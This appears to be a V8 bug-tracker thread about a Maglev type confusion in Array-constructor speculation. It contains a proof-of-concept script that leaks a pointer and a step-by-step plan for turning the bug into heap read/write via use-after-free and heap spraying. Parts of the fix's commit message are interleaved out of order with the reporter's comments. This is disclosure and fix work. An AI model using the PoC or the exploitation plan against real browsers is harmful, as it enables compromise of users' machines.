## Description

VULNERABILITY DETAILS

## 1 Why Crash?

After Maglev optimization, an incorrect `JSArray` object was created for `arr2`, leading to a crash when `arr2.join()` was executed. The abnormal `JSArray` object is as follows.

```
DebugPrint: 0x9b10084a591: [JSArray]
 - map: 0x28cd02827311 <Map[16](PACKED_SMI_ELEMENTS)> [FastProperties]
 - prototype: 0x28cd02827339 <JSArray[0]>
 - elements: 0x28cd0284a581 <FixedArray[2]> [PACKED_SMI_ELEMENTS]
 - length: 2
 - properties: 0x28cd020007bd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x9b100000df1: [String] in ReadOnlySpace: #length: 0x28cd026e8c99 <AccessorInfo name= 0x28cd02000df1 <String[6]: #length>, data= 0x28cd02000011 <undefined>> (const accessor descriptor, attrs: [W__]), location: descriptor
 }
 - elements: 0x28cd0284a581 <FixedArray[2]> {
           0: 0x28cd0284a575 <HeapNumber 1.0>
           1: 0
 }

```

Note: `elements_kind = PACKED_SMI_ELEMENTS` implies that the array should contain only Smis, but in reality, `elements[0]` is not a Smi, but a pointer to a `HeapNumber` object.

The vulnerability occurs in the `TryReduceConstructArrayConstructor()` method of Maglev.

## 2 Maglev Optimize ArrayConstructor

### 2.1 Collect Type Info

For the case of `new Array(x0, x1, ...)`, this method first iterates over all argument nodes and collects some type information at compile time.

```
MaybeReduceResult MaglevGraphBuilder::TryReduceConstructArrayConstructor(
    compiler::JSFunctionRef array_function, CallArguments& args,
    compiler::OptionalAllocationSiteRef maybe_allocation_site) {
    ...

  // Arity > 1, `new Array(x0, x1, ...)`.
  DCHECK_GT(arity, 1);
  DCHECK_EQ(variant, InlineArrayCtorVariant::kMultipleArgs);

  // Gather the values to store into the newly created array, and remember
  // sufficient information about node types so we can select a suitable
  // elements_kind below.
  bool values_all_smis = true, values_all_numbers = true,
       values_any_nonnumber = false;
  base::SmallVector<ValueNode*, 16> values;
  values.reserve(arity);
  for (ValueNode* v : args) {
    NodeType node_type = GetType(v);
    if (!NodeTypeIs(node_type, NodeType::kSmi)) {
      values_all_smis = false;
      if (!NodeTypeIs(node_type, NodeType::kNumber)) {
        values_all_numbers = false;
        if (!NodeTypeCanBe(node_type, NodeType::kNumber)) {
          values_any_nonnumber = true;
        }
      }
    }
    values.push_back(v);
  }
  ...
}

```

In this example, the two argument nodes for the `ArrayConstructor` are:

- `n55 : LoadHoleyFixedDoubleArrayElement [n51, n26]`: Represents the `float64` value loaded from `arr[i]`. The `NodeType` for this node is `kNumberOrOddball` (It's confusing that `kNumberOrOddball` suggests this might be a `HeapNumber` object, but in reality, this node can only be of type `float64`).
- `n24 : Phi(r5) [n10, n22]`: Represents the node for `i`, with a `NodeType` of `SMI`.

Because `kNumberOrOddball` is neither `SMI` nor `Number`, the execution results in `values_all_smis=false`, `values_all_numbers=false`, and `values_any_nonnumber=false`. This means we cannot make any definitive inferences about the types of the argument nodes at compile time.

### 2.2 Speculative Optimization

Subsequently, the `elements_kind` is updated based on `values_all_smis`, `values_all_numbers`, and `values_any_nonnumber`. However, since they are all `false`, the `elements_kind` remains as the initial `PACKED_SMI_ELEMENTS` (obtained originally from the `initial_map`). Furthermore, with `can_speculate_call` enabled by default, execution continues, proceeding with speculative optimization.

```
MaybeReduceResult MaglevGraphBuilder::TryReduceConstructArrayConstructor(
    compiler::JSFunctionRef array_function, CallArguments& args,
    compiler::OptionalAllocationSiteRef maybe_allocation_site) {
  ...

  if (values_all_smis) {    // false
    // Smis can be stored with any elements kind.
  } else if (values_all_numbers) {  // false
    elements_kind = GetMoreGeneralElementsKind(
        elements_kind, IsHoleyElementsKind(elements_kind)
                           ? HOLEY_DOUBLE_ELEMENTS
                           : PACKED_DOUBLE_ELEMENTS);
  } else if (values_any_nonnumber) {    // false
    // We statically know that at least one value is not a number.
    elements_kind = GetMoreGeneralElementsKind(
        elements_kind,
        IsHoleyElementsKind(elements_kind) ? HOLEY_ELEMENTS : PACKED_ELEMENTS);
  } else if (!can_speculate_call) {    // <=== allow default, continue optimize
    // We cannot precisely determine the elements_kind based on static types,
    // and speculation has already been disabled via feedback.
    return {};
  }

  ...
}

```

At this point in the code, the type of `56: HoleyFloat64ToTagged [n55]` is `kNumberOrOddball`, but the `elements_kind` remains `PACKED_SMI_ELEMENTS`, indicating the array contains only Smis. This is clearly incorrect. However, since we are performing speculative optimization, the expectation is that inserted nodes will detect this issue at runtime and prevent the optimization from proceeding.

### 2.3 Inline ArrayConstructor

```
MaybeReduceResult MaglevGraphBuilder::TryReduceConstructArrayConstructor(
    compiler::JSFunctionRef array_function, CallArguments& args,
    compiler::OptionalAllocationSiteRef maybe_allocation_site) {
    ...

  // insert check node
  if (IsSmiElementsKind(elements_kind)) {    // If we expect all elements in the array to be SMIs
    for (ValueNode* v : args) {
      // If node v is already known to be of SMI type at compile time, no runtime check is needed
      if (NodeTypeIs(GetType(v), NodeType::kSmi)) continue;    
      // If it cannot be determined whether it is an SMI at compile time, it's a speculative optimization, so a CheckSmi node must be inserted
      RETURN_IF_ABORT(BuildCheckSmi(v));    
    }
  } else if (IsDoubleElementsKind(elements_kind)) {
    ...
  }

  // Allocate JSArray and FixedArray Object
  return BuildAndAllocateJSArray(
      initial_map, GetSmiConstant(arity),
      BuildElementsArray(elements_kind, base::VectorOf(values)),
      slack_tracking_prediction, allocation_type);
}

```

Subsequently, check nodes are inserted based on the `elements_kind`:

- Since the node type of `n55 : LoadHoleyFixedDoubleArrayElement [n51, n26]` is `kNumberOrOddball`, the compile-time cannot guarantee it's an SMI. Therefore, `CheckSmi(v)` is called to check at runtime whether the value of this node is an SMI.
- The `ValueRepresentation` of the `n55` node is `kHoleyFloat64`, so `BuildCheckSmi()` inserts a `CheckHoleyFloat64IsSmi()` node. **Note: This node only checks whether the `Float64` value can be represented as an SMI; it does not guarantee that the `ValueRepresentation` of the `n55` node becomes `SMI`.** In this example, the `Float64` value loaded by `n55` is `1.0`, so it passes this node's check.

Finally, `BuildElementsArray()` is called to create a `VirtualObject`, attempting to write the value from the `n55 : LoadHoleyFixedDoubleArrayElement [n51, n26]` node into `arr2->elements[0]`. Since this field only accepts values of type `kTagged`, materializing the `VirtualObject` generates a `n56 : HoleyFloat64ToTagged [n55]` node to convert the `Float64` into a `HeapNumber` object. Ultimately, the `TaggedPointer` of the `HeapNumber` object is written into the array whose `elements_kind` is `PACKED_SMI_ELEMENTS`.

I believe the root cause of this vulnerability lies in the incorrect use of `BuildCheckSmi()` during the speculative optimization of `new Array(x, y, ...)`. **This method only ensures the value can be represented as an SMI. What we actually need is to convert the `Float64` into an SMI and write that into the array.**

### 2.4 Maglev Graph

Ultimately, the following Maglev graph will be generated:

```
         // Load the i-th float64 value from `arr`
         55: LoadHoleyFixedDoubleArrayElement [n51, n26], 3 uses, cannot truncate to int32
         // create HeapNumber Object for float64
         56: HoleyFloat64ToTagged [n55], 2 uses
         ...

         // Check float64 can be represented by SMI
         59: CheckHoleyFloat64IsSmi [n55]

          // ALlocate FixedArray for `arr2`
         65: AllocationBlock(Young), 2 uses
         66: InlinedAllocation(object 0x28cd020005dd <Map(FIXED_ARRAY_TYPE)>) [n65], 5 uses (5 non escaping uses)
         67: StoreMap(0x28cd020005dd <Map(FIXED_ARRAY_TYPE)>, InlinedAllocation) [n66] // map
         68: StoreTaggedFieldNoWriteBarrier(0x4) [n66, n60]    // length
         69: StoreTaggedFieldWithWriteBarrier(0x8) [n66, n56]    // values[0] = HeapNumber <===
         70: StoreTaggedFieldNoWriteBarrier(0xc) [n66, n24]    // values[1] = i

         // Allocation JSArray for `arr2`
         71: InlinedAllocation(object 0x28cd02827311 <Map[16](PACKED_SMI_ELEMENTS)>) [n65], 5 uses (4 non escaping uses)
         72: StoreMap(0x28cd02827311 <Map[16](PACKED_SMI_ELEMENTS)>, InlinedAllocation) [n71] // map, kind=PACKED_SMI_ELEMENTS
         73: StoreTaggedFieldNoWriteBarrier(0x4) [n71, n64]    // properties
         74: StoreTaggedFieldNoWriteBarrier(0x8) [n71, n66]    // elements
         75: StoreTaggedFieldNoWriteBarrier(0xc) [n71, n60]    // length

```
## 3 Commit Bisection

This vulnerability was introduced in the following commit, which added speculative optimization for `new Array(x, y, ...)`. It is precisely this feature that introduced the vulnerability.

## 4 Maybe Exploitable?

I believe this is a sufficiently powerful bug because `elements_kind` is used in many places, and I am currently attempting to exploit it.

In fact, when executing this POC in release mode, you will find that after triggering the vulnerability, `arr2.join()` returns a peculiar string: `4346106,0`. The number `4346106` corresponds to `0x4250fa`, which is exactly the result of the `HeapNumber` object pointer from `arr2[0]` being right-shifted by one. This indicates that `join()` leaked the pointer by mistaking it for a SMI.

REPRODUCTION CASE

poc.js:

```
// HOLEY_DOUBLE_ELEMENTS
const arr = [1, , , , , 1.1];

function opt_me() {
    for (let i = 0; i < 5; i++) {
        const ele = arr[i];
        const arr2 = Array(ele, i); // PACKED_SMI_ELEMENTS
        function inner() {
            arr2.join();    // <=== crash here
            arr.__proto__ = ele;
        }
        inner();
    }
}

%PrepareFunctionForOptimization(opt_me);
opt_me();
%OptimizeMaglevOnNextCall(opt_me);
opt_me();

```

V8 must be built with a debug configuration, Execute v8 as follows:

```
./d8 \
    --allow-natives-syntax \
    ./poc.js

```

This will result in the following crash:

```
abort: CSA_DCHECK failed: Torque assert 'Is<A>(o)' failed [src/builtins/cast.tq:946] [../../src/builtins/array-join.tq:423] [../../src/builtins/array-join.tq:814]

### jg...@chromium.org (2025-10-24)

The LoadHoleyFixedDoubleArrayElement node goes into GetTaggedValue (see backtrace below), which finds a HoleyFloat64ToTagged node as alternative:

```
(gdb) p value->Print()
n55 : LoadHoleyFixedDoubleArrayElement [n51, n26], 3 uses, cannot truncate to int32
$16 = void
(gdb) p GetType(value)
$17 = v8::internal::maglev::NodeType::kSmi
(gdb)  p alt->Print()
n56 : HoleyFloat64ToTagged [n55], 1 uses
$14 = void
(gdb) p ((HoleyFloat64ToTagged*)alt)->conversion_mode()
$15 = v8::internal::maglev::HoleyFloat64ToTagged::ConversionMode::kForceHeapNumber

```

conversion\_mode should be kCanonicalizeSmi instead.

[maglev] Ensure smi canonicalization after Array ctor speculation

---


Expand for full commit details
```
     
    kHoleyFloat64 isn't canonicalized to smi by default (since 
    https://crrev.com/c/5250113); but canonicalization is required for uses 
    where we first `BuildCheckSmi(value)` and then expect canonicalization 
    prior to any use. 
     
    To fix this specific case, we explicitly ask for GetSmiValue in 
    ConvertForField when the node type is kSmi.

### hu...@gmail.com (2025-10-28)

Hi, I've reviewed your patch, and I think you're right. The root cause lies in the default mode of `HoleyFloat64ToTagged` being set to ForceHeapNumber. I was too hasty in my initial analysis and failed to identify the correct root cause.

Additionally, I’d like to share some progress on the exploit. I attempted to write a `HeapNumber` object pointer into the `JSArray::length` field and then manipulate the array length through push/pop operations to forge a fake pointer. However, during testing, I found that since I had used this method before, Maglev has since implemented defenses against it. Specifically, when attempting to write to the `JSArray::length` field, the `mode` of `HoleyFloat64ToTagged` is forcibly converted to `CanonicalizeSmi`. After further research, I concluded that there is no way to bypass this, which indeed posed a significant challenge. Fortunately, I have since discovered a new exploitation method.

For arrays of type `PACKED_SMI_ELEMENTS`, Turbofan assumes that the elements in the array are of the `TaggedSigned` type. Therefore, when writing to other object fields, it does not add a `WriteBarrier`, nor does it perform SMI untagging. Instead, it directly writes the SMI. For example, consider the following code snippet:

```
function write_without_WB(arr_dst, arr_src) {
    arr_dst[0] = arr_src[0];
}

let arr_dst = [1, 2, 3, 4, 5];
let packed_smi_arr = [1, 2, 3, 4, 5];

For this vulnerability, we can create an array with `elements_kind = PACKED_SMI_ELEMENTS` but whose elements are actually `HeapNumber` objects. When calling `write_without_WB(arr_dst, evil_arr)`, a `HeapNumber` object pointer will be written to `arr_dst[0]`, but no `WriteBarrier` will be added. Thus, the vulnerability is transformed into a UAF (use-after-free) vulnerability. The specific exploitation steps are as follows:

- Use the vulnerability to create an `evil_arr` where `evil_arr[0]` is a `HeapNumber` object.
- Trigger incremental marking, which marks `arr_dst->elements` but does not mark the `HeapNumber` object.
- Use `write_without_WB(arr_dst, evil_arr)` to write the pointer.
- Release the reference to the `HeapNumber` object by setting `evil_arr[0] = undefined`.
- Complete incremental marking, which results in the `HeapNumber` object being freed. This leaves a dangling pointer in `arr_dst[0]`.
- Perform heap spraying by allocating a large number of `FixedDoubleArray` objects. Use floating-point numbers to forge a `JSArray` object with a very large length in `arr_dst[0]`, enabling arbitrary read and write operations within the v8 heap.

However, precisely controlling incremental marking is quite complex. I am currently working on heap fengshui issues and will provide a detailed exploit later.

Here is my exploit. To facilitate control over Incremental Marking, I've enabled some additional flags. I've already explained the exploit's principles, and the comments should be sufficiently detailed.

The most critical part is how to control the order in which Incremental Marking marks objects. After studying `ProcessMarkingWorklist()`, I found it's a scanning algorithm similar to BFS. Therefore, I constructed the `heap_fengshui_obj` object:

- The three fields `deep0`, `padding`, and `arr_dst` are all in-object properties. So when scanning the `JSObject` corresponding to `heap_fengshui_obj`, these three pointers will be pushed into the worklist in sequence, thus controlling the scanning order.
- During scanning, starting from `heap_fengshui_obj`, objects with shallower depth are visited first, while objects with deeper depth are visited last. Therefore, the access order will be: `deep0 => padding => arr_dst => deep1 => padding->elements => arr_dst->elements => ...`
- Since a single Incremental Marking Step can only process 64KB of objects, we just need to ensure there are enough objects in `padding` to avoid accessing `evil_arr` after accessing `arr_dst->elements`.

    .. since current use patterns around BuildCheckSmi rely on this. 
    The expectation is that if `BuildCheckSmi(value)` passes at runtime, 
    then the value is guaranteed to be a smi when accessed later (e.g. 
    when it is stored into a slot). 
     
    One example: Array ctor speculation that picks the PACKED_SMI_ELEMENTS 
    elements kind, and guards values with `BuildCheckSmi`. 
     
    Some workarounds for this can now be removed; I've added comments 
    there and we can attempt that separately.
